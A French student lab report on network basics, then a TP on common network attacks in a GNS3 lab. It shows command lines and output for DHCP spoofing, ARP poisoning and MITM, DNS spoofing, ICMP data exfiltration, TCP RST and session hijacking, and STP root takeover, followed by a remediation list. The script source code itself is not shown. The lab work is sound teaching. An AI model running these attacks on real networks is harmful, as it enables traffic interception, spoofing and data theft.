#EFREI

# Rendu de TP

# TPs

# Index

## TP2: Common Network Attacks
[View TP2 Files](./tp2/)

## Download All Files
[Download tp2](./tp2.zip)


---

## TP1: Premiers pas GNS, Cisco et VLAN
### Section 1
```
🌞 Commençons simple
1 -
	PC1> ip 10.3.1.1/24
	Checking for duplicate address...
	PC1 : 10.3.1.1 255.255.255.0

	PC2> ping 10.3.1.1/24 
	Checking for duplicate address...
	PC2 : 10.3.1.2 255.255.255.0

 
2 -
	PC2> ping 10.3.1.1/24   

	84 bytes from 10.3.1.1 icmp_seq=1 ttl=64 time=0.657 ms
	84 bytes from 10.3.1.1 icmp_seq=2 ttl=64 time=1.194 ms
	84 bytes from 10.3.1.1 icmp_seq=3 ttl=64 time=0.649 ms
	84 bytes from 10.3.1.1 icmp_seq=4 ttl=64 time=0.997 ms
	84 bytes from 10.3.1.1 icmp_seq=5 ttl=64 time=0.930 ms
3 - 
	IOU1#show mac address-table 
		  Mac Address Table
	-------------------------------------------

	Vlan    Mac Address       Type        Ports
	----    -----------       --------    -----
	   1    0050.7966.6800    DYNAMIC     Et0/0
	   1    0050.7966.6801    DYNAMIC     Et0/1
	Total Mac Addresses for this criterion: 2

II. VLAN
```

### Section 2
```
🌞 Adressage
1 -
	PC3> ip 10.3.1.3/24
	Checking for duplicate address...
	PC3 : 10.3.1.3 255.255.255.0
2 -
	PC3> ping 10.3.1.1

	84 bytes from 10.3.1.1 icmp_seq=1 ttl=64 time=0.424 ms
	84 bytes from 10.3.1.1 icmp_seq=2 ttl=64 time=1.056 ms
	84 bytes from 10.3.1.1 icmp_seq=3 ttl=64 time=0.808 ms
	84 bytes from 10.3.1.1 icmp_seq=4 ttl=64 time=0.962 ms
	84 bytes from 10.3.1.1 icmp_seq=5 ttl=64 time=0.816 ms

	PC3> ping 10.3.1.2

	84 bytes from 10.3.1.2 icmp_seq=1 ttl=64 time=0.713 ms
	84 bytes from 10.3.1.2 icmp_seq=2 ttl=64 time=0.777 ms
	84 bytes from 10.3.1.2 icmp_seq=3 ttl=64 time=0.895 ms
	84 bytes from 10.3.1.2 icmp_seq=4 ttl=64 time=0.911 ms
	84 bytes from 10.3.1.2 icmp_seq=5 ttl=64 time=0.961 ms

```

### Section 3
```
🌞 Configuration des VLANs
1 - 
	IOU1#conf t
	Enter configuration commands, one per line.  End with CNTL/Z.
	IOU1(config)#Vlan 10
	IOU1(config-vlan)#exit
	IOU1(config)#Vlan 20
	IOU1(config-vlan)#exit
	IOU1(config)#
2 -
	IOU1#conf t
	Enter configuration commands, one per line.  End with CNTL/Z.
	IOU1(config)#Vlan 10
	IOU1(config-vlan)#exit
	IOU1(config)#Vlan 20
	IOU1(config-vlan)#exit

3 -
	IOU1(config)#int eth0/1
	IOU1(config-if)#sw ac V   
	IOU1(config-if)#sw ac Vlan 10
	IOU1(config-if)#exit
	IOU1(config)#int eth0/0   
	IOU1(config-if)#sw ac Vlan 10
	IOU1(config-if)#exit         
	IOU1(config)#int eth0/2   
	IOU1(config-if)#sw ac Vlan 20
	IOU1(config-if)#exit

```

### Section 4
```
🌞 Vérif
1 -
	PC1> ping 10.3.1.2

	84 bytes from 10.3.1.2 icmp_seq=1 ttl=64 time=0.405 ms
	84 bytes from 10.3.1.2 icmp_seq=2 ttl=64 time=0.733 ms
	84 bytes from 10.3.1.2 icmp_seq=3 ttl=64 time=0.667 ms
	84 bytes from 10.3.1.2 icmp_seq=4 ttl=64 time=0.895 ms
	84 bytes from 10.3.1.2 icmp_seq=5 ttl=64 time=0.951 ms

	PC2> ping 10.3.1.1/24

	84 bytes from 10.3.1.1 icmp_seq=1 ttl=64 time=0.768 ms
	84 bytes from 10.3.1.1 icmp_seq=2 ttl=64 time=0.939 ms
	84 bytes from 10.3.1.1 icmp_seq=3 ttl=64 time=0.678 ms
	84 bytes from 10.3.1.1 icmp_seq=4 ttl=64 time=0.605 ms
	84 bytes from 10.3.1.1 icmp_seq=5 ttl=64 time=0.679 ms
2 -
	PC1> ping 10.3.1.3

	host (10.3.1.3) not reachable

	PC2> ping 10.3.1.3/24

	host (10.3.1.3) not reachable

	PC3> ping 10.3.1.1

	host (10.3.1.1) not reachable

	PC3> ping 10.3.1.2

	host (10.3.1.2) not reachable

III. Ptite VM DHCP
```

### Section 5
```
🌞 VM dhcp.tp3.b2 

	PC4> ip dhcp
	DDORA IP 10.3.1.101/24 GW 10.3.1.254

	PC4> sh ip

	NAME        : PC4[1]
	IP/MASK     : 10.3.1.101/24
	GATEWAY     : 10.3.1.254
	DNS         : 
	DHCP SERVER : 10.3.1.253
	DHCP LEASE  : 43135, 43200/21600/37800
	MAC         : 00:50:79:66:68:03
	LPORT       : 20017
	RHOST:PORT  : 127.0.0.1:20018
	MTU         : 1500


	PC5> ip dhcp
	DDD
	Can't find dhcp server



```

## TP2: Common network attacks
### Section 1
```
🌞 Le routeur doit pouvoir joindre internet
1 -
	R1(config-if)#ip add dhcp

	R1#sh ip int br
	Interface                  IP-Address      OK? Method Status                Protocol
	FastEthernet0/0            10.2.1.254      YES manual up                    up      
	FastEthernet1/0            192.168.122.204 YES DHCP   up                    up      
	FastEthernet1/1            unassigned      YES unset  administratively down down    
	FastEthernet2/0            unassigned      YES unset  administratively down down    
	FastEthernet2/1            unassigned      YES unset  administratively down down
2 - 
	R1#ping 1.1.1.1

	Type escape sequence to abort.
	Sending 5, 100-byte ICMP Echos to 1.1.1.1, timeout is 2 seconds:
	!!!!!
	Success rate is 100 percent (5/5), round-trip min/avg/max = 72/379/1484 ms

```

### Section 2
```
🌞 Configuration d'un NAT simpliste
	R1(config)#int fa0/0
	R1(config-if)#ip nat outside

	*Nov 25 11:06:12.307: %LINEPROTO-5-UPDOWN: Line protocol on Interface NVI0, changed state to up
	R1(config-if)#exit
	R1(config)#
	R1(config)#
	*Nov 25 11:06:18.403: %SYS-3-CPUHOG: Task is running for (2036)msecs, more than (2000)msecs (1/1),process = Exec.
	-Traceback= 0x616DCA5C 0x616A40EC 0x616A43AC 0x616A44D0 0x616A44D0 0x616A53A0 0x616D81F0 0x616E43E8 0x616CE7E0 0x616CF444 0x616D0394 0x6128CB5C 0x6068D928 0x606A9BEC 0x6074E794 0x6074E778 
	*Nov 25 11:06:18.843: %SYS-3-CPUYLD: Task ran for (2476)msecs, more than (2000)msecs (1/1),process = Exec
	R1(config)#int fa1/0     
	R1(config-if)#ip nat inside 
	R1(config-if)#exit
	R1(config)#acce
	R1(config)#access-list 1 permit any
	R1(config)#ip nat insi
	R1(config)#ip nat inside s
	R1(config)#ip nat inside source l
	R1(config)#ip nat inside source list 1 in
	R1(config)#ip nat inside source list 1 interface fa0/0 overlo
	R1(config)#ip nat inside source list 1 interface fa0/0 overload 
	R1(config)#exit
	R1#
	R1#c
	*Nov 25 11:07:53.535: %SYS-5-CONFIG_I: Configured from console by console
	R1#copy run start
	Destination filename [startup-config]? 
	Building configuration...
	
```

### Section 3
```
🌞 Proof !
	PC1> ping 1.1.1.1

	84 bytes from 1.1.1.1 icmp_seq=1 ttl=126 time=40.236 ms
	84 bytes from 1.1.1.1 icmp_seq=2 ttl=126 time=43.358 ms
	84 bytes from 1.1.1.1 icmp_seq=3 ttl=126 time=54.242 ms
	84 bytes from 1.1.1.1 icmp_seq=4 ttl=126 time=32.758 ms
	84 bytes from 1.1.1.1 icmp_seq=5 ttl=126 time=44.382 ms

	PC2> ping 8.8.8.8

	84 bytes from 8.8.8.8 icmp_seq=1 ttl=126 time=39.231 ms
	84 bytes from 8.8.8.8 icmp_seq=2 ttl=126 time=33.851 ms
	84 bytes from 8.8.8.8 icmp_seq=3 ttl=126 time=33.783 ms
	84 bytes from 8.8.8.8 icmp_seq=4 ttl=126 time=34.935 ms
	84 bytes from 8.8.8.8 icmp_seq=5 ttl=126 time=33.738 ms

	PC6> ip dhcp
	DDORA IP 10.2.1.104/24 GW 10.2.1.254

	PC6> ping 1.1.1.1

	84 bytes from 1.1.1.1 icmp_seq=1 ttl=126 time=40.006 ms
	84 bytes from 1.1.1.1 icmp_seq=2 ttl=126 time=43.286 ms
	84 bytes from 1.1.1.1 icmp_seq=3 ttl=126 time=34.091 ms
	84 bytes from 1.1.1.1 icmp_seq=4 ttl=126 time=44.497 ms
	84 bytes from 1.1.1.1 icmp_seq=5 ttl=126 time=34.544 ms


II - Atk this

2 - Attaques DHCP

```

### Section 4
```
	🌞 Mettre en place un serveur DHCP sur la machine attaquante
		┌─[user@parrot]─[~/Documents/tp2]
		└──╼ $sudo nano /etc/dnsmasq.conf
		┌─[user@parrot]─[~/Documents/tp2]
		└──╼ $sudo vi /etc/dnsmasq.conf
		┌─[user@parrot]─[~/Documents/tp2]
		└──╼ $sudo systemctl restart dnsmasq
		┌─[user@parrot]─[~/Documents/tp2]
		└──╼ $sudo systemctl enable dnsmasq
		Synchronizing state of dnsmasq.service with SysV service script with /lib/systemd/systemd-sysv-install.
		Executing: /lib/systemd/systemd-sysv-install enable dnsmasq
		Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 44.
		insserv: warning: current start runlevel(s) (empty) of script `dnsmasq' overrides LSB defaults (2 3 4 5).
		insserv: warning: current stop runlevel(s) (0 1 2 3 4 5 6) of script `dnsmasq' overrides LSB defaults (0 1 6).
		Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 44.
		Created symlink /etc/systemd/system/multi-user.target.wants/dnsmasq.service → /lib/systemd/system/dnsmasq.service.


3 - Attaques ARP

	A - Poioning
		PC1> show arp

		00:11:22:33:44:55  192.168.1.100 expires in 105 seconds 

		─[user@parrot]─[~/Documents]
		└──╼ $sudo python arp_poisoning.py 10.2.1.51 192.168.1.100 00:11:22:33:44:55
		Envoyé : 192.168.1.100 (00:11:22:33:44:55) vers 10.2.1.51
		Envoyé : 192.168.1.100 (00:11:22:33:44:55) vers 10.2.1.51

	B - Spoofing

```

### Section 5
```
	🌞 Mettez en place un ARP spoofing

		PC1> show arp

		ca:01:16:e1:00:00  10.2.1.254 expires in 33 seconds 
		00:50:79:66:68:01  10.2.1.52 expires in 37 seconds 

	C - MITM

```

### Section 6
```
	🌞 Mettez en place un Man-in-the-middle ARP

		┌─[✗]─[user@parrot]─[~/Documents]
		└──╼ $sudo python arp_mitm.py 10.2.1.51 10.2.1.254
		Envoyé : 10.2.1.254 est 08:00:27:52:78:05 à 10.2.1.51
		Envoyé : 10.2.1.51 est 08:00:27:52:78:05 à 10.2.1.254
		Envoyé : 10.2.1.254 est 08:00:27:52:78:05 à 10.2.1.51
		Envoyé : 10.2.1.51 est 08:00:27:52:78:05 à 10.2.1.254
		Envoyé : 10.2.1.254 est 08:00:27:52:78:05 à 10.2.1.51
		Envoyé : 10.2.1.51 est 08:00:27:52:78:05 à 10.2.1.254
		Envoyé : 10.2.1.254 est 08:00:27:52:78:05 à 10.2.1.51
		Envoyé : 10.2.1.51 est 08:00:27:52:78:05 à 10.2.1.254
		Envoyé : 10.2.1.254 est 08:00:27:52:78:05 à 10.2.1.51
		Envoyé : 10.2.1.51 est 08:00:27:52:78:05 à 10.2.1.254
		Envoyé : 10.2.1.254 est 08:00:27:52:78:05 à 10.2.1.51
		Envoyé : 10.2.1.51 est 08:00:27:52:78:05 à 10.2.1.254
		Envoyé : 10.2.1.254 est 08:00:27:52:78:05 à 10.2.1.51
		Envoyé : 10.2.1.51 est 08:00:27:52:78:05 à 10.2.1.254

		PC1> ping 10.2.1.254

		84 bytes from 10.2.1.254 icmp_seq=1 ttl=254 time=17.545 ms
		84 bytes from 10.2.1.254 icmp_seq=2 ttl=254 time=7.883 ms
		84 bytes from 10.2.1.254 icmp_seq=3 ttl=254 time=7.907 ms
		84 bytes from 10.2.1.254 icmp_seq=4 ttl=254 time=7.579 ms
		84 bytes from 10.2.1.254 icmp_seq=5 ttl=254 time=9.762 ms

		PC1> ping 1.1.1.1

		84 bytes from 1.1.1.1 icmp_seq=1 ttl=125 time=52.658 ms
		84 bytes from 1.1.1.1 icmp_seq=2 ttl=125 time=47.844 ms
		84 bytes from 1.1.1.1 icmp_seq=3 ttl=125 time=36.922 ms
		84 bytes from 1.1.1.1 icmp_seq=4 ttl=125 time=37.202 ms
		84 bytes from 1.1.1.1 icmp_seq=5 ttl=125 time=48.567 ms


4 - DNS Spoofing

	┌─[user@parrot]─[~/Documents/dns]
	└──╼ $sudo python3 dns_spoof.py 
	Écoute des requêtes DNS pour le domaine efrei.fr....
	Requête pour le domaine : &.1.1.1.
	Requête pour un autre domaine : &.1.1.1.. Passage sans intervention.
	Requête pour le domaine : &.1.1.1.
	Requête pour un autre domaine : &.1.1.1.. Passage sans intervention.
	Requête pour le domaine : google.com.
	Requête pour un autre domaine : google.com.. Passage sans intervention.
	Requête pour le domaine : google.com.
	Requête pour un autre domaine : google.com.. Passage sans intervention.
	Réponse DNS pour google.com. autorisée.
	Réponse DNS pour google.com. autorisée.
	Requête pour le domaine : efrei.fr.
	Interception de la requête DNS pour efrei.fr.. Envoi de la réponse usurpée.
	Requête pour le domaine : efrei.fr.
	Interception de la requête DNS pour efrei.fr.. Envoi de la réponse usurpée.
	Réponse DNS légitime pour efrei.fr. bloquée.
	Réponse DNS légitime pour efrei.fr. bloquée.
	Réponse DNS légitime pour efrei.fr. bloquée.
	Réponse DNS légitime pour efrei.fr. bloquée.


5 - Exfiltration ICMP

A. Basics
```

### Section 7
```
🌞 Exfiltration ICMP basique

	┌─[user@parrot]─[~/Documents/Exfiltration]
	└──╼ $sudo python3 icmp_basic_exfiltr.py 10.2.1.51 "Hello World"
	Message 'Hello World' sent to 10.2.1.51 via ICMP packets.

```

### Section 8
```
🌞 Receiver exfiltration ICMP basique

	┌─[user@parrot]─[~/Documents/Exfiltration]
	└──╼ $sudo python3 icmp_basic_receiver.py
	Listening for ICMP packets...
		


	 123456789:;<=>?
		


	 123456789:;<=>?
		


	 123456789:;<=>?
		


	 123456789:;<=>?
		


	 123456789:;<=>?


B. File exfiltration
```

### Section 9
```
🌞 File exfiltration

	┌─[user@parrot]─[~/Documents/Exfiltration]
	└──╼ $sudo python icmp_file_receiver.py
	En attente de fichiers exfiltrés via ICMP...
	pkt received
	payload is b"Hello world\nI am Here to let you know my name\nI am Toxic Ghost\nNice to meet y'all\nBye.....;\n"
	pkt received
	payload is b"Hello world\nI am Here to let you know my name\nI am Toxic Ghost\nNice to meet y'all\nBye.....;\n"

	xabk\xce\xb9\xe8\xf2\xe0\xf9Qg\xdc"\x0en\xb9\xe6Ba\xe5\x9a\x90K\x8e\xa9\xd0\xcd`W\xbc|wSca\xfa-\xc5%\xa5\xed0\xa8\xf6e\x0f\xdb\x81(}\xe4/\xf6\x90\xec\xfbJ[\xabW\xb6Bd\x0c\x1d\x8bE\x9f,$\xca>\x9cCDd\xe6\x0b5x0\x85\xc7\xd0\x1c6l\xdcl\xdb\xb6\xd8\x92\xbd\xb4\xa2\xdb\xb6\x1bn\xed\xf9\xc8\x9f\x8bk\xe4\xb6\xe9\r\xe5]\xef\xddS\\O\x1b\xdb4\x8e\xf9\xc0\xb7\xcc\xff`\xcd\r_;\xa6\xcf\xa2\x19\x9b#\x16\xca`\xd1\x9eU\xd3?Z\x19\xed\x1c\xd6\x10I\xd1\x88Z\xa4\x8a\x13{\x9e\xd6\xbbh\x00\xe3E\xccN\x91\r5\xb55\xb5u{ m\xf1&\xd8\xb3\xa7\xb6\x04J:\xa5\xcaw\x16\xed\xd9\xf0\xd1\x12\x9e\xa0\x8e\xea@\x14\xf7\xe9[Y\xbdic\xcbZ\xe4\x1b\x0c\x06\x83\xc1`0t\x18V\xaeZ\xdd\xd6Q\xe8\xd8\x98\x81z\x9e\xa4f\xbf\x9f\x9a\xfd~[\xc7\xc2\xd0!A\x96\xc0E\xa6\xc1\x10\x86)<\x86\xe6\xf0\xf2\xa4\xa9/M|S?S\x06\xfc\xb4\xce\xd6\x90"\xb6&MS\xf7\xd44\xb2b\xe8\x88\x9ep\xa9v\xe1\x94\x89\xac\xb2>:\xea|\xe7\xb2\xd9\xb3Z1F{\x13G\xec?\xfa\xf0\xa2\x11\x8dM\xf6\xb6\x9a\x9d\x96]\xccx*\x93\xb1KyY\x17^\xc9\x805\x01/-*\xaf\xad\xad\xadoH\xf7\xac\xac\xec\xd5\xaf[\xd5\x86\x9dm\x1d\xe5\xe6\xc2z\x1epde\xf5\x17k\xb7\xa7\xbb\x8e8m\xfc\xf0\xed\xf3\x9eZo\x9c\xde\x1b\x0c\x06\x83\xc1`\xd8\x1b\xd9]]}\xd67/\xbb\xe3\xb6\x1f\x8c\x1b{<\x00\xdc\xf4\xc3\x9f\xac^\xbb\x16\x00&\xbd\xf8,cl\xdd\x86\r7\xfc\xe0G\x000\xf6\xd8c\xee\xba\xfd\x87\x00\xf0\xdc\x8b/?\xfc\xf8Sm\x1a\xe5\x0e\x8f\xd1a\r\x06\x83\xc1`\xd87@d^\x8f:\x8d\x00\x93\x1a\x00\xc4\n\x1b+\x87m\xd9\xda\x1b|\xc7\x17\xf3w\xb4u$\xf6R>\xf8]\xd5\x07P\xd5\xd6\xb1hU\xac\xd2\x1e#\xc7\x9fyV\xefN|w\xd5W\x0b_~nv6\xa7\xd6\x06\x83\xc1`0\x18\x0c\x1d\x87tZ.!Kg2DTSS\x9b\xce\xc8\xbd\x81\xf6\xec\xa9\xab\xa9q}rr\x9b\x8b?\x1b\xd4\x92\xfc\xa6\xc6\xa6$\x0b4\r1$\xd2akkk\xcb\xcb\xfd{\xcf\xd6\xd6\xd6\xe6z\x8d\xc1`0\x18\x0c\x06\x83\xc1\x90\x08\xbe\xe3\xfdG\x7f\xd3\xfa\x8b\x8f\xd2\xeb?|\xf6\x91\x0f[\xfd\xb1-C\x1b\xa5\xa1\xc1`0\x18\x0c\x86v\xcb\x82E\x8b\xe6\x7f\xba\xb0K\x97\xf2\x19\xef} \xce|\xf8\xd1\xdc\x91#\xf6g\x88\x19%\xc8n\xdc\\\xc5\x10\xb7l\xdb.\xfe\xacoh\xd8\xb8is\xc6\xce\xcc\xfddA\xdbDz/"\xd1>]\x06\x08\xec\xd3e0$\xc7\xb7O\x97\xc1`0\x18\x0c\x06\x83\xc1`0\x18\x0c\x06\xc3^\x83\xd9\xa7+!\xc6/\x81\xc1`0\x18\x0c\x06\x83\xc1`0\x18\x0c\x06\x83\xc1`(\x00\x97\x1cS\xd1\xd6Qh\xbf\x18\x1d\xd6`0\x18\x0c\x06\x83\xc1`0\x18\x0c\x06\x83\xc1`04\x17\xdd\xb8\xd5\x10\x84\xb5u\x04\x0c\x06\x83\xc1`0\x18\x0c\x06\x83\xc1`0\x18\x0c\x06\x83a/\xc7\xe8\xb0\x06\x83\xc1`0\x18\x0c\x06\x83\xc1`0\x18\x0c\x06\x83\xc1\xd0\xb2\x18\xbf\x04I9\xfd\xee\xe9m\x1d\x05CGe\xfa\xef\xcfk\xeb(\x18\x0c\x06\x83\xc1`0\x18\x0c\x06\x83\xc1`0\x18\xda\x12c\x0fk0\x18\x0c\x06\x83\xc1`0\x18\x0c\x06\x83\xc1`0\x18\x0c-\xcb\xff\x07u\xfdn\x82\xef5?\'\x00\x00\x00\x00IEND\xaeB`\x82'

	^Z
	[9]+  Stopped                 sudo python icmp_file_receiver.py


6 - TCP

A. TCP RST

	┌─[✗]─[user@parrot]─[~/Documents/TCP]
	└──╼ $sudo python tcp_rst.py 10.2.1.56 1234 10.2.1.57 1234 1234567890
	Paquet RST envoyé à 10.2.1.56:9999 en usurpant 10.2.1.57:1234

B. Bonus: Session Hijacking

	┌─[✗]─[user@parrot]─[~/Documents/TCP]
	└──╼ $sudo python tcp_hijack.py 10.2.1.56 1234 10.2.1.57 1234 1000 2000 "Hello, hiajcked!"
	Paquet injecté: 10.2.1.57:1234 -> 10.2.1.56:1234
	Seq: 1000, Ack: 2000
	Payload: Hello, hiajcked!


7 - L'arbe qui dure

	┌─[user@parrot]─[~/Documents/stp]
	└──╼ $sudo python3 stp_rb.py
	[*] Starting STP attack...
	[*] Forging BPDU...
	[*] BPDU forged successfully.
	[*] Starting BPDU spamming. Press Ctrl+C to stop.
	^C
	[!] Stopping BPDU spamming.
	[*] STP attack completed.


Proof
AVANT
	IOU1#show spanning-tree 

	VLAN0001
	  Spanning tree enabled protocol ieee
	  Root ID    Priority    32769
		     Address     aabb.cc00.0100
		     This bridge is the root
		     Hello Time   2 sec  Max Age 20 sec  Forward Delay 15 sec

	  Bridge ID  Priority    32769  (priority 32768 sys-id-ext 1)
		     Address     aabb.cc00.0100
		     Hello Time   2 sec  Max Age 20 sec  Forward Delay 15 sec
		     Aging Time  300 sec

	Interface           Role Sts Cost      Prio.Nbr Type
	------------------- ---- --- --------- -------- --------------------------------
	Et0/0               Desg FWD 100       128.1    P2p 
	Et0/1               Desg FWD 100       128.2    P2p 
	Et0/2               Desg FWD 100       128.3    P2p 
	Et0/3               Desg FWD 100       128.4    P2p 
	Et1/0               Desg FWD 100       128.5    P2p 
	Et1/1               Desg FWD 100       128.6    P2p 
	Et1/2               Desg FWD 100       128.7    P2p 
	Et1/3               Desg FWD 100       128.8    P2p 
          
APRES
	IOU1#show spanning-tree 

	VLAN0001
	  Spanning tree enabled protocol ieee
	  Root ID    Priority    1
		     Address     0800.2752.7805
		     Cost        100
		     Port        6 (Ethernet1/1)
		     Hello Time   2 sec  Max Age 20 sec  Forward Delay 15 sec

	  Bridge ID  Priority    32769  (priority 32768 sys-id-ext 1)
		     Address     aabb.cc00.0100
		     Hello Time   2 sec  Max Age 20 sec  Forward Delay 15 sec
		     Aging Time  300 sec

	Interface           Role Sts Cost      Prio.Nbr Type
	------------------- ---- --- --------- -------- --------------------------------
	Et0/0               Desg FWD 100       128.1    P2p 
	Et0/1               Desg FWD 100       128.2    P2p 
	Et0/2               Desg FWD 100       128.3    P2p 
	Et0/3               Desg FWD 100       128.4    P2p 
	Et1/0               Desg FWD 100       128.5    P2p 
	Et1/1               Root FWD 100       128.6    P2p 
	Et1/2               Desg FWD 100       128.7    P2p 


```
## Remédiations
```

Voici des propositions de remédiations pour les 7 attaques mises en œuvre :
1. DHCP Spoofing et Starvation
   - Activer DHCP Snooping sur les switches pour filtrer les messages DHCP non autorisés
   - Configurer des ports de confiance (trusted ports) uniquement pour les serveurs DHCP légitimes
   - Limiter le nombre de requêtes DHCP par seconde sur les ports non fiables
2. ARP Poisoning/Spoofing/MitM
   - Utiliser des entrées ARP statiques pour les équipements critiques
   - Implémenter la détection d'ARP spoofing sur les switches
   - Activer l'inspection dynamique ARP (DAI) sur les switches
3. DNS Spoofing
   - Mettre en place DNSSEC pour authentifier les réponses DNS
   - Utiliser des serveurs DNS de confiance et sécurisés
   - Implémenter un filtrage DNS avancé pour détecter les comportements suspects
4. Exfiltration ICMP
   - Filtrer ou bloquer le trafic ICMP aux pare-feux si non nécessaire
   - Limiter la taille des paquets ICMP autorisés
   - Mettre en place une surveillance du trafic ICMP pour détecter les anomalies
5. TCP RST Attack
   - Implémenter des vérifications plus strictes des numéros de séquence TCP
   - Utiliser des protocoles chiffrés comme TLS pour protéger les connexions TCP
   - Configurer les pare-feux pour détecter et bloquer les paquets RST suspects
6. TCP Session Hijacking
   - Utiliser des protocoles chiffrés (TLS/SSL) pour toutes les communications sensibles
   - Implémenter une authentification forte et continue des sessions
   - Utiliser des numéros de séquence TCP aléatoires et imprévisibles
7. STP Attack
   - Activer les fonctionnalités de sécurité STP comme BPDU Guard et Root Guard sur les switches
   - Configurer manuellement les rôles des ports STP pour les liens critiques
   - Utiliser des protocoles alternatifs comme Rapid PVST+ ou MST qui sont plus résistants aux attaques

Ces remédiations permettent de réduire significativement les risques liés à ces attaques, mais il est important de les combiner avec une surveillance continue du réseau, des mises à jour régulières des équipements et une formation adéquate du personnel IT pour maintenir un niveau de sécurité optimal.

```


## Files

All associated files (Python scripts, pcapng files) are included in the `tp2.zip` file.

